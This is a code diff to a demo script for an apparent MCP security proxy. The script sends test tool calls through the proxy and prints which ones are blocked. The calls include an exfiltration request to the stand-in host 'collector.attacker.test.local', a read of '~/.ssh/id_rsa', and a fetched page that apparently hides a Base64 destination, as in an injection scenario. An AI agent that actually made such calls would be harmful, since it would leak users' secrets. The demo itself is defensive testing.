@@ -7,7 +7,8 @@ import sys
 
 
 def main(policy: str) -> int:
-    cmd = [sys.executable, "-m", "bawwab", "mcp-proxy", "--policy", policy, "--name", "demo", "--",
+    name = "taint" if "taint" in policy else "demo"
+    cmd = [sys.executable, "-m", "bawwab", "mcp-proxy", "--policy", policy, "--name", name, "--",
            sys.executable, "-m", "bawwab.testing.fake_mcp_server"]
     p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True, bufsize=1)
 
@@ -21,12 +22,13 @@ def main(policy: str) -> int:
     print(f"client sees tools: {tools}")
     for i, (tool, args) in enumerate([
             ("read_note", {"title": "groceries"}),
-            ("fetch_url", {"url": "http://attacker.test.local/collect?d=secret"}),
+            ("fetch_url", {"url": "https://news.example.test/page"}),          # page hides a destination (Base64)
+            ("fetch_url", {"url": "https://collector.attacker.test.local/in?d=notes"}),
             ("read_note", {"title": "~/.ssh/id_rsa"}),
             ("format_table", {"rows": []})], start=3):
         r = ask(i, "tools/call", {"name": tool, "arguments": args})["result"]
         status = "BLOCKED" if r.get("isError") else "allowed"
-        print(f"tools/call {tool}({json.dumps(args)}) -> {status}: {r['content'][0]['text'][:110]}")
+        print(f"tools/call {tool}({json.dumps(args)}) -> {status}: {r['content'][0]['text'][:150]}")
     p.stdin.close()
     p.wait()
     return 0
